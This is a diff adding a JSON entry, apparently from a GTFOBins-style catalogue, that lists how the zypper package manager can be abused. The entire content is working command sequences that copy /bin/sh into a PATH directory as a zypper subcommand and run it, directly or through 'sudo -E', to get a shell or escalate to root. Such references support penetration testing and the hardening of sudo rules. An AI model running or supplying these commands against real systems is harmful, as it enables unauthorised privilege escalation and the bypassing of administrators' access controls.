@@ -1,0 +1,22 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "description": "This requires '/bin/sh' to be copied to '/usr/lib/zypper/commands/zypper-x' and this usually requires elevated privileges.",
+        "code": "zypper x\n"
+      },
+      {
+        "code": "TF=$(mktemp -d)\ncp /bin/sh $TF/zypper-x\nexport PATH=$TF:$PATH\nzypper x\n"
+      }
+    ],
+    "sudo": [
+      {
+        "description": "This requires '/bin/sh' to be copied to '/usr/lib/zypper/commands/zypper-x' and this usually requires elevated privileges.",
+        "code": "sudo zypper x\n"
+      },
+      {
+        "code": "TF=$(mktemp -d)\ncp /bin/sh $TF/zypper-x\nexport PATH=$TF:$PATH\nsudo -E zypper x\n"
+      }
+    ]
+  }
+}
